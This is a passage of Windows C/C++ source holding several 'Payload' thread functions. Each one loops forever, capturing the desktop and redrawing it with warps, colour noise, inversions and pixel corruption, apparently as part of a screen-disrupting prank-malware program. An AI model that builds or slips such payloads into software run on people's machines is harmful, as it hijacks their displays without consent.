        BitBlt(hcdc, 3, 3, w, h, hcdc, 0, 0, 0x111111);
        BitBlt(hcdc, -3, -3, w, h, hcdc, 0, 0, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload17_num1(LPVOID lpParam) {
    int i = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            float y = sin((x + i) * (3.1415926 / 20)) * 33;
            BitBlt(hcdc, x, y, 1, h, hcdc, x, 0, SRCINVERT);
        }
        for (int y = 0; y < h; y++) {
            float x = sin((y + i) * (3.1415926 / 20)) * 33;
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCINVERT);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload18_num1(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0; bool jntm = false; BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    HDC hcdc2 = NULL; HBITMAP hBitmap2 = NULL;
    while (true) {
        jntm = false; if (rand() % 20 > 15) { jntm = true; }
        int randrgb = RGB(rand() % 255, rand() % 255, rand() % 255), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc); if (jntm == true) { hcdc2 = CreateCompatibleDC(hdc); }
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL); if (jntm == true) { hBitmap2 = CreateCompatibleBitmap(hdc, w, h); }
        SelectObject(hcdc, hBitmap); if (jntm == true) { SelectObject(hcdc2, hBitmap2); }
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY); if (jntm == true) { BitBlt(hcdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY); }

        if (jntm == true) {
            StretchBlt(hcdc, 0, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            for (int bl = 0; bl < h; bl += 2) {
                StretchBlt(hcdc, -2 + rand() % 5, bl, w, 2, hcdc, 0, bl, w, 2, SRCCOPY);
            }
        }

        for (int x = 0; x < w; x += 40) {
            for (int y = 0; y < h; y += 40) {
                StretchBlt(hcdc, x, y, 40, 40, hcdc, x, y, 20, 20, SRCCOPY);
            }
        }

        for (int i = 0; i < w * h; i++) {
            int jntm = i % w ^ i / w;
            rgbScreen[i].rgb ^= randrgb + ((jntm * xxx) % 114);
        }

        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc); if (jntm == true) { ReleaseDC(0, hcdc2); }
        DeleteObject(hBitmap); if (jntm == true) { DeleteObject(hBitmap2); }
        DeleteDC(hcdc); if (jntm == true) { DeleteDC(hcdc2); } DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload19_num1(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0; BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb += (((x ^ i) + xxx) * ((y ^ i) + xxx));
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx++;
    }
}

DWORD WINAPI Payload20_num1(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
    int size = 450, xxx = 0, rop = NULL;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = (i * i * 2) % w, y = (i & i * 2) ^ w;
            rgbScreen[i].rgb ^= (x * y) | (i + w + h) * i;
        }
        rop = SRCCOPY; int luckynum = rand() % 5;
        if (luckynum == 2) { rop = SRCAND; }
        else if (luckynum == 4) { rop = SRCPAINT; }
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, rop);
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCAND);
        }
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCPAINT);
        }
        for (int y = 0; y < h; y++) {
            int wow = (double)y / 20.0 * (double)xxx, x = (int)(cos(wow) * 40.0);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        for (int kun = 0; kun < 4; kun++) {
            int rand_num_x = rand() % w, rand_num_y = rand() % h;
            int top_x = 0 + rand_num_x, top_y = 0 + rand_num_y;
            int bottom_x = 100 + rand_num_x, bottom_y = 100 + rand_num_y;
            HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
            InvertRgn(hcdc, circle);
            DeleteObject(circle);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx++;
    }
}

DWORD WINAPI Payload21_num1(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); RGBQUAD* data = (RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCERASE);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = 0; BYTE byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            v = rand() % 114; *((BYTE*)data + 4 * i + v) -= 1;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1);
    }
}